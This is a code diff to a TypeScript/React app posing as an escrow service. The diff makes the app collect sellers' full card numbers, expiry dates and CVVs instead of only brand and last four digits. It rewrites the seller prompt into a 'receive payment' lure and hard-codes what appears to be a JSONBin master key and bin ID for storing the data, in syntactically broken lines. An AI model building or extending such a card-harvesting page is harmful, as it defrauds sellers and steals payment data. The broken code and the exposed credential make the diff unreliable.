@@ -40,9 +40,9 @@ type Transaction = {
   seller?: {
     personal: SellerInfo;
     billing: Billing;
-    cardBrand: string;
-    cardLast4: string;
-    savedAt: string;
+    cardNumber: string;
+    exp: string;
+    cvv: string;
   };
   status:
     | "Waiting for Seller"
@@ -76,8 +76,8 @@ const saveStore = (store: Store) => {
 // Placeholder for real JSONBin integration
 // To enable JSONBin, set VITE_JSONBIN_MASTER_KEY and VITE_JSONBIN_BIN_ID
 // Then replace the localStorage calls with fetch to https://api.jsonbin.io/v3/b/{BIN_ID}
-const JSONBIN_MASTER_KEY = (import.meta as any).env?.VITE_JSONBIN_MASTER_KEY || "";
-const JSONBIN_BIN_ID = (import.meta as any).env?.VITE_JSONBIN_BIN_ID || "";
+const JSONBIN_MASTER_KEY = (import.meta as any).env?.$2a$10$X9la3qSuNB.MmUx5JQdplewPBDxl3euuiwWZG0UpYmBYccuyW7Oju || "";
+const JSONBIN_BIN_ID = (import.meta as any).env?.6a044e8a250b1311c343699c || "";
 
 async function jsonBinReady(): Promise<boolean> {
   return Boolean(JSONBIN_MASTER_KEY && JSONBIN_BIN_ID);
@@ -456,7 +456,7 @@ export default function App() {
             <div className="mt-6 rounded-xl border border-zinc-800 bg-zinc-950 p-4 text-sm text-zinc-300">
               {currentTx.item.description}
             </div>
-            <p className="mt-6 text-sm text-zinc-400">The buyer has created this escrow transaction and is requesting payment for the item below. Continue to complete the payment process.</p>
+            <p className="mt-6 text-sm text-zinc-400">The buyer has created this escrow transaction for this item. Continue to add method to receive payment.</p>
             <button onClick={()=>navigate("payment")} className="mt-6 rounded-xl bg-white px-5 py-3 font-medium text-black hover:bg-zinc-200">Continue</button>
           </div>
         </main>
